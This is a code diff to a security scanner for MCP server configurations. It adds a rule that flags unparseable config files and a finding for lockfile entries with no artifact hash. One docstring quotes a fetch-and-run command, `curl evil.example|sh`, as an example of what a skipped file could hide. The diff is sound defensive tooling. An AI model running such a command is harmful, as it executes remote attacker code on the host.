@@ -28,6 +28,55 @@ def _lock(ctx: AuditContext) -> dict:
     return {"servers": servers, "skills": skills}
 
 
+@rule("MCPA039", "Configuration file could not be read", Severity.HIGH)
+def unreadable_config(ctx: AuditContext) -> Iterable[Finding]:
+    """A config exists, was not parsed, and its servers were never checked.
+
+    The scan printed a parse error and then reported `No findings` and
+    `clean`; `ci` exited 0; the SARIF carried nothing at all. So a file
+    holding `sh -c "curl evil.example|sh"` passed a build gate because one
+    brace was missing.
+
+    This project already refuses that trade everywhere else it comes up.
+    `pkgcache` says an absent artifact "is not a pass and is never reported
+    as one". MCPA037 exists so an unverified registry hash cannot read as a
+    verified one. The MCP server's own `check_config` says, in a comment,
+    never to answer "0 findings" for input it could not read. The scanner's
+    main path was the one place that did.
+
+    It is not hypothetical that a client reads a file this cannot. VS Code's
+    JSONC parser recovers from errors that Python's `json` plus the comment
+    stripper both reject, so `.vscode/mcp.json` can be a file the client
+    loads and the scanner skips.
+
+    A format this scanner never parses -- YAML, TOML -- is deliberately not
+    here. That is a permanent documented gap rather than something going
+    wrong now, and firing on it forever would make this the finding people
+    switch off.
+    """
+    for path, reason in ctx.unreadable:
+        yield Finding(
+            rule_id="MCPA039",
+            title="Configuration file could not be read",
+            severity=Severity.HIGH,
+            location=Location(path=path, line=0),
+            evidence=(
+                f"{path} exists and did not parse ({reason}), so any server "
+                f"configured in it was not checked by any rule"
+            ),
+            remediation=(
+                "Fix the file so it parses, then re-scan. Until it does, this "
+                "scan says nothing about what is configured in it -- which is "
+                "not the same as saying there is nothing wrong. A client with "
+                "a more forgiving parser may be loading and running the "
+                "servers inside it right now."
+            ),
+            atlas=["AML.T0010"],
+            cwe=["CWE-1284"],
+            tags=["coverage", "shadow-mcp"],
+        )
+
+
 @rule("MCPA014", "Server is not in the approval lockfile", Severity.HIGH)
 def unapproved_server(ctx: AuditContext) -> Iterable[Finding]:
     """A server appeared that was never reviewed."""
@@ -432,6 +481,14 @@ def _recorded_integrity(ctx: AuditContext) -> Iterator[tuple]:
             continue
         recorded = entry.get("integrity")
         if not isinstance(recorded, dict) or not recorded:
+            # An approved registry launch with no hash recorded against it is
+            # not "nothing to check here". It is the case where nothing was
+            # looked at, and MCPA037 is the rule for could-not-see. Skipping
+            # it meant `approve --safe` produced a lock whose missing pin no
+            # scan ever mentioned again.
+            from ..integrity import expects_hash
+            if expects_hash(s):
+                yield s, {}, {}
             continue
         urls = entry.get("artifact_urls")
         yield s, recorded, urls if isinstance(urls, dict) else {}
@@ -526,6 +583,37 @@ def integrity_unverified(ctx: AuditContext) -> Iterable[Finding]:
 
     strict = bool(ctx.options.get("require_integrity"))
     for s, recorded, urls in _recorded_integrity(ctx):
+        if not recorded:
+            # Approved, fetches a pinned registry artifact, and the lock
+            # holds no hash for it. Strictly less evidence than a hash that
+            # could not be checked, which this rule already reports -- so it
+            # cannot be the quieter of the two.
+            yield Finding(
+                rule_id="MCPA037",
+                title="Registry artifact could not be verified",
+                severity=Severity.HIGH if strict else Severity.LOW,
+                location=Location(path=s.source, line=s.line,
+                                  snippet=s.command_line[:200]),
+                evidence=(
+                    f"{s.identity()} fetches a pinned registry package and the "
+                    f"lockfile records no artifact hash for it, so nothing "
+                    f"verifies the bytes it runs; the version string alone is "
+                    f"a name lookup"
+                ),
+                remediation=(
+                    "Re-run `mcp-pin approve` where the registry is reachable. "
+                    "An approval taken under `--safe`, or on a machine that "
+                    "could not reach the registry, records no hash -- and a "
+                    "lock with no hash is the one case where nothing was "
+                    "looked at. `--require-integrity` makes this HIGH and "
+                    "refuses the launch."
+                ),
+                server=s.identity(),
+                atlas=["AML.T0010.001"],
+                cwe=["CWE-494"],
+                tags=["drift", "supply-chain", "coverage"],
+            )
+            continue
         local = {c.key: c for c in cache_check(recorded, urls)}
         answer = _ask_registry(ctx, s)
         for key in sorted(recorded, key=str):
